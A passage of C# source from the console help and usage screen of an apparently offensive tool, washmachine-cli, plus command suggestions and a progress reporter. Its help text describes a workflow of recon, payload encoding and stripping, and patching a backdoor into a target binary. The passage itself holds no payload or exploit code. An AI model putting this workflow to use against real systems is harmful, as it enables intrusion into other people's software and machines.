            ("Interactive", "Run a bare command (e.g. 'backdoor') with no required flags to drop into a Metasploit-style configuration session."),
            ("REPL",        "Launch washmachine-cli with no arguments to enter the persistent shell with banner, history, and tab completion."),
            ("Help / version", "Help: 'help', '--help', '-h', '-?'. Version: '--version', '-V', 'version'."),
        };
        int modeLabelWidth = modeNotes.Max(n => n.label.Length);
        foreach (var (label, desc) in modeNotes)
            AnsiConsole.MarkupLine($"  [{UiColors.Label}]{Markup.Escape(label.PadRight(modeLabelWidth))}[/]   [{UiColors.Value}]{Markup.Escape(desc)}[/]");

        // Command index — with one-line example each
        UsageFormatter.PrintSectionHeader("Commands");
        foreach (var cmd in commands)
        {
            string name = cmd.Name.PadRight(nameWidth);
            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]{Markup.Escape(name)}[/]   [{UiColors.Value}]{Markup.Escape(cmd.Summary)}[/]");
            if (cmd.Examples is { Length: > 0 })
                AnsiConsole.MarkupLine($"  [{UiColors.Muted}]{new string(' ', nameWidth)}     e.g.  {Markup.Escape(cmd.Examples[0].Command)}[/]");
        }

        // REPL-only chrome commands
        UsageFormatter.PrintSectionHeader("REPL-only commands");
        var replCommands = new (string name, string desc)[]
        {
            ("scheme",  "List or switch the active color scheme (e.g. 'scheme dracula')."),
            ("banner",  "Reprint the welcome chrome and info grid."),
            ("clear",   "Clear the screen (also: 'cls')."),
            ("version", "Print the CLI version."),
            ("exit",    "Leave the REPL (also: 'quit', 'q')."),
        };
        int replLabelWidth = replCommands.Max(c => c.name.Length);
        foreach (var (name, desc) in replCommands)
            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]{Markup.Escape(name.PadRight(replLabelWidth))}[/]   [{UiColors.Value}]{Markup.Escape(desc)}[/]");

        // Getting started
        UsageFormatter.PrintSectionHeader("Getting started");
        foreach (var bullet in new[]
        {
            "Run 'provision' once if you want Bin2Shell available before your first encode.",
            "Use 'show templates', 'show modules', and 'show encoders' to discover valid IDs on this machine.",
            "Use 'help <command>' when you want details for one command without leaving the terminal flow.",
            "Common flow: 'analyze target' to recon, then 'backdoor' to patch — or 'encode' → 'strip' → 'backdoor'.",
            "Inside a session, type 'show options' for the parameter table and 'help <OPTION>' for details on any field.",
        })
            AnsiConsole.MarkupLine($"  [{UiColors.Value}]· {Markup.Escape(bullet)}[/]");

        // Shell and path tips
        UsageFormatter.PrintSectionHeader("Shell and path tips");
        var shellNotes = new[]
        {
            ("Windows PowerShell / pwsh", @"Use .\payload.bin or C:\path\payload.bin, and quote paths with spaces."),
            ("Bash / Zsh",                @"Use ./payload.bin or /path/payload.bin, and quote paths with spaces."),
            ("Shared",                    "Flags and command names stay the same across shells; only path style and quoting change."),
            ("Env",                       "WASHMACHINE_SCHEME selects the color scheme. Set NO_COLOR to any non-empty value to disable all ANSI styling (https://no-color.org)."),
        };
        int shellLabelWidth = shellNotes.Max(n => n.Item1.Length);
        foreach (var (label, desc) in shellNotes)
            AnsiConsole.MarkupLine($"  [{UiColors.Label}]{Markup.Escape(label.PadRight(shellLabelWidth))}[/]   [{UiColors.Value}]{Markup.Escape(desc)}[/]");

        // Documentation
        UsageFormatter.PrintSectionHeader("Documentation");
        AnsiConsole.MarkupLine($"  [{UiColors.Value}]· https://0xhmza.github.io/washmachine/cli-reference.html[/]");

        AnsiConsole.WriteLine();
        return 0;
    }

    private static int PrintUnknownCommand(string command)
    {
        var validCommands = new[] { "encode", "analyze", "backdoor", "strip", "show", "provision", "test", "scan", "help" };

        AnsiConsole.WriteLine();
        WriteStatus(StatusPrefix.Failure, $"Unknown command: '{command}'");
        AnsiConsole.WriteLine();

        var suggestions = SuggestSimilarNames(command, validCommands, 3);
        if (suggestions.Count > 0)
        {
            AnsiConsole.MarkupLine($"[{UiColors.Muted}]Did you mean:[/]");
            foreach (var s in suggestions)
                AnsiConsole.MarkupLine($"  [{UiColors.Accent}]{Markup.Escape(s)}[/]");
            AnsiConsole.WriteLine();
        }

        AnsiConsole.MarkupLine($"[{UiColors.Muted}]Available commands:[/]");
        foreach (var c in validCommands.Where(c => c != "help"))
            AnsiConsole.MarkupLine($"  [{UiColors.Accent}]{c}[/]");

        AnsiConsole.WriteLine();
        AnsiConsole.MarkupLine($"[{UiColors.Muted}]Run[/] [{UiColors.Accent}]help[/] [{UiColors.Muted}]for usage information, or[/] [{UiColors.Accent}]help <command>[/] [{UiColors.Muted}]for one command.[/]");
        return 1;
    }

    private static int LevenshteinDistance(string s, string t)
    {
        int n = s.Length, m = t.Length;
        var d = new int[n + 1, m + 1];
        for (int i = 0; i <= n; i++) d[i, 0] = i;
        for (int j = 0; j <= m; j++) d[0, j] = j;
        for (int i = 1; i <= n; i++)
            for (int j = 1; j <= m; j++)
                d[i, j] = Math.Min(Math.Min(d[i - 1, j] + 1, d[i, j - 1] + 1),
                    d[i - 1, j - 1] + (s[i - 1] == t[j - 1] ? 0 : 1));
        return d[n, m];
    }

    // ═══════════════════════════════════════════════════════════════════════
    //  Spectre.Console progress reporter
    // ═══════════════════════════════════════════════════════════════════════

    private sealed class SpectreProgressReporter : IProgressReporter
    {
        private readonly ProgressTask _task;

        public SpectreProgressReporter(ProgressTask task)
        {
            _task = task;
        }

        public void UpdateStatus(string message, int percentComplete)
        {
            _task.Description = message;
            if (percentComplete >= 0)
            {
                _task.IsIndeterminate = false;
                _task.Value = percentComplete;
            }
            else
            {
                _task.IsIndeterminate = true;
            }
        }

        public void Close()
        {
            _task.Value = 100;
            _task.StopTask();
        }
    }
}
